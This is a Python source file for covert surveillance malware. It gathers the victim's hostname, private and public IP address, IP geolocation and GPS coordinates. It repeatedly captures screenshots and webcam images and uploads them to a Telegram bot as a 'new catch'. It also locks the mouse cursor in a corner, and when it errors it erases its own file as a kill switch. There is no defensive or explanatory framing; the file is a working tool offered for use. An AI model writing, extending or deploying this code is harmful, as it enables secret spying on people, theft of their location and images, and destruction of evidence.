import os
try:
    import requests
    import socket
    import cv2
    import geocoder
    from lackey import *
    from PIL import Image as imgg
    import pyautogui
    #import keyboard
    import threading
#    import time
except:
    os.system('pip install geocoder')
    os.system('pip install pillow')
    os.system('pip install lackey')
    os.system('pip install requests')
    os.system('pip install socket')
    os.system('pip install pyautogui')
    #os.system('pip install keyboard')
    os.system('pip install threading')
    os.system('pip install opencv-python')
id = ''#telegram channel id
token = ''#telegram bot token
error, x, ver, ip, img_counter, sc = 0, '', '', '', 0, 0
def m():
    global error
    try:
        while True:
            try:
                #if keyboard.is_pressed('k'):
                #    break
                pyautogui.moveTo(0, 0)
            except:
                ''
    except:
        error += 1
def info(x, error):
        try:
            hostname = socket.gethostname()
            private_ip = socket.gethostbyname(hostname)
            x += f'\nprivate ip: {private_ip}'
        except:
            x += '\nprivate ip not found'
            error += 1
        try:
            gip = requests.get('https://api.ipify.org').text
            ip = requests.get(f'http://ip-api.com/json/{gip}')
            x += f'\nip: {gip}'
            x += '\nip info'
            x += '\n-----'
            x += f'{ip.json()}'
            try:
                geo = geocoder.ip('me')
                x += f'\ngps: {geo.latlng}'
            except:
                error += 1
        except:
            error += 1
        try:
            x += '\n-----'
            f = open('new-catch.txt', 'w+')
            f.write(str(x))
            s = open('new-catch.txt', 'rb')
            files = {'document': s}
            f.close()
            url = 'https://api.telegram.org/bot' + token + '/sendDocument?chat_id=' + id + '&caption=new catch'
            requests.post(url, files=files)
            s.close()
            os.remove('new-catch.txt')
        except:
            url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + id + '&text=failed to send new catch'
            requests.get(url)
            error += 1
def iscreen(error, sc):
    try:
        capture = Screen().capture()
        image = imgg.fromarray(capture)
        image.save(f'omk{sc}.bmp')
        o = open(f'omk{sc}.bmp', 'rb')
        files = {'photo' : o}
        def send_screen(files, o, error):
            url = 'https://api.telegram.org/bot' + token + '/sendPhoto?chat_id=' + id
            requests.post(url, files=files)
            file = open(o.name, 'w')
            file.write('')
            file.close()
            o.close()
            try:
                os.remove(o.name)
            except:
                error += 1
        threading.Thread(target=send_screen, args=(files, o, error,)).start()
    except Exception as e:
        print(e)
        error += 1
def killswitch():
    file = open(__file__, 'w')
    file.write('')
def cam(img_counter, error):
    #time.sleep(1)
    cam = cv2.VideoCapture(0)
    try:
        while True:
            ret, frame = cam.read()
            img_counter += 1
            img_name = "opencv_frame_{}.png".format(img_counter)
            cv2.imwrite(img_name, frame)
            K = open(f'opencv_frame_{img_counter}.png', 'rb')
            files = {'photo': K}
            threading.Thread(target=iscreen, args=(error, sc,)).start()
            def send_cam():
                url = 'https://api.telegram.org/bot' + token + '/sendPhoto?chat_id=' + id
                requests.post(url, files=files)
            threading.Thread(target=send_cam()).start()
            K.close()
            os.remove(img_name)
    except:
        url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + id + f'&text=kill switch - error count = {error}'
        requests.get(url)
        killswitch()
try:
    threading.Thread(target=m).start()
    threading.Thread(target=info, args=(x, error)).start()
    threading.Thread(target=cam, args=(img_counter, error)).start()
except:
    error += 1
